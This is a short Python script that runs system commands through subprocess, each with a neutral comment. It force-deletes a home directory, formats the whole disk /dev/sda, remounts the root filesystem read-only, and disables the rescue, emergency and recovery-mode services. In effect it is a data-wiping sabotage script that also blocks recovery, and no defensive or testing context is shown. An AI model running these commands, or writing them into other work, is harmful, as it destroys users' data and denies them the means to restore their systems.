import subprocess

# Remove a directory and its contents recursively and forcefully
subprocess.run(['rm', '-rf', '/home/f/forfun'])

# Make a file immutable
subprocess.run(['chattr', '+i', '/home/f/test/Traffic_signaling_raw_sockets.py'])

# Create a file system without support for discarding blocks
subprocess.run(['mkfs.ext4', '-E', 'nodiscard', '/dev/sda'])

# Remount the root filesystem as read-only
subprocess.run(['mount', '-o', 'remount,ro', '/'])

# Disable systemd-backlight service
subprocess.run(['systemctl', 'disable', 'systemd-backlight@.service'])

# Disable apport service
subprocess.run(['systemctl', 'disable', 'apport.service'])

# Disable rescue service
subprocess.run(['systemctl', 'disable', 'rescue.service'])

# Disable emergency service
subprocess.run(['systemctl', 'disable', 'emergency.service'])

# Disable recovery-mode service
subprocess.run(['systemctl', 'disable', 'recovery-mode.service'])

